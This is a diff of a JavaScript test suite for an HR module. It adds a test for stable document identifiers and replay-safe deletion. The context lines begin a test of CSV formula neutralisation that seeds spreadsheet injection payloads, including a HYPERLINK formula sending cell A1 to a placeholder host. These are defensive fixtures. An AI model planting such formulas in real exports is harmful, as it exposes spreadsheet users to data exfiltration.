@@ -907,6 +907,22 @@ describe('Module Ressources humaines', () => {
     assert.equal((await admin.get(`/api/rh/habilitations/${h.id}/documents/0`)).status, 404);
   });
 
+  test('pièces d\'une habilitation : identifiant stable (uid) ; une suppression rejouée ne retire pas la pièce suivante', async () => {
+    const p = await personne({ nom: 'Pièces', prenom: 'Uid', secteurId: maint.id });
+    const h = await admin.ok('POST', '/api/rh/habilitations', { personnelId: p.id, typeCode: 'sst', dateObtention: '2025-01-01' });
+    const pdf = (nom) => ({ nom, type: 'application/pdf', contenu: 'data:application/pdf;base64,' + Buffer.from('%PDF-1.4 ' + nom).toString('base64') });
+    const r1 = await admin.ok('POST', `/api/rh/habilitations/${h.id}/documents`, pdf('a.pdf'));
+    const r2 = await admin.ok('POST', `/api/rh/habilitations/${h.id}/documents`, pdf('b.pdf'));
+    const [d1, d2] = r2.documents;
+    assert.equal(r1.documents.length, 1);
+    assert.ok(/^u[0-9a-f]{10}$/.test(d1.uid) && d1.uid !== d2.uid, 'uid posé à l\'ajout');
+    assert.equal((await admin.get(`/api/rh/habilitations/${h.id}/documents/${d2.uid}`)).status, 200, 'lecture par uid');
+    const sup = await admin.ok('DELETE', `/api/rh/habilitations/${h.id}/documents/${d1.uid}`);
+    assert.deepEqual(sup.documents.map((d) => d.nom), ['b.pdf']);
+    assert.equal((await admin.del(`/api/rh/habilitations/${h.id}/documents/${d1.uid}`)).status, 404, 'requête rejouée : 404, la pièce suivante est conservée');
+    assert.equal(srv.db.get('habilitations', h.id).documents.length, 1);
+  });
+
   test('exports CSV : les cellules commençant par un caractère de formule sont neutralisées', async () => {
     await personne({ nom: '=HYPERLINK("http://exemple.invalid/?x="&A1;"Cliquer")', prenom: '+SUM(1;2)', fonction: '@cmd', secteurId: maint.id, coutHoraire: 40.5 });
     const csv = String((await admin.get('/api/rh/export/personnel')).body);
